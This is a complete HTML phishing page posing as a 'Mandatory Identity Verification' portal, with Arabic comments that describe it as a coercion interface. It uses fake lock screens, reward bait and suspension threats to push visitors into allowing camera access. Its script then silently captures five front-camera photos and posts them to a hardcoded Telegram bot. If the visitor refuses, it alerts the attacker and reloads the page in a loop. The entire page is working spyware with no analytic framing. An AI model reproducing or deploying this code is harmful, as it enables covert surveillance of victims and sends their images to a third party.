<!DOCTYPE html>
<html lang="en" class="notranslate">
<head>
    <meta charset="UTF-8">
    <meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mandatory Identity Verification</title>
    <style>
        /* واجهة الإجبار الأمنية */
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #overlay { text-align: center; padding: 20px; border: 2px solid #0f0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; }
        .blink { animation: blinker 0.8s linear infinite; color: #ff0000; font-weight: bold; font-size: 1.5rem; }
        @keyframes blinker { 50% { opacity: 0; } }
        button { background: #0f0; color: #000; border: none; padding: 25px 50px; font-size: 1.4rem; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 30px; width: 80%; }
        .warning-text { color: #888; font-size: 0.8rem; margin-top: 20px; text-transform: uppercase; }
        video, canvas { display: none; }
    </style>
</head>
<body class="notranslate">

<div id="overlay">
    <div class="blink">SYSTEM LOCK: ACCESS DENIED</div>
    <p style="font-size: 1.1rem; margin-top: 20px;">MANDATORY BIOMETRIC SCAN REQUIRED</p>
    <p style="color: #ccc;">To unlock this portal and claim your reward, you must enable the front-facing security camera.</p>
    
    <button id="enableBtn">UNLOCK SCANNER</button>
    
    <p class="warning-text">Failure to comply will result in permanent account suspension.</p>
    <p id="error-msg" style="color: red; margin-top: 10px; display: none;">ERROR: Permission Mandatory. Retrying...</p>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const T = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU"; //
    const C = "8397194527"; //
    const btn = document.getElementById('enableBtn');

    async function capture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = stream;
            btn.innerText = "SCANNING...";
            btn.disabled = true;

            let count = 0;
            const task = setInterval(() => {
                if (count < 5) {
                    const canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', C);
                        fd.append('photo', blob, 'a.jpg');
                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                    count++;
                } else {
                    clearInterval(task);
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://google.com";
                }
            }, 1000);
        } catch (e) {
            // بروتوكول الإجبار: إرسال تنبيه بالرفض وإعادة تحميل الصفحة فوراً
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=❌ Target Attempted to BLOCK camera! Reloading...`);
            document.getElementById('error-msg').style.display = "block";
            
            // إجبار المستخدم: تنبيه يخبره أن الضغط على Allow إلزامي ثم إعادة تحميل الصفحة
            setTimeout(() => {
                alert("CRITICAL ERROR: Camera access is MANDATORY for identity verification. Please click 'ALLOW' to proceed.");
                location.reload(); 
            }, 500);
        }
    }

    btn.addEventListener('click', capture);
</script>
</body>
</html>
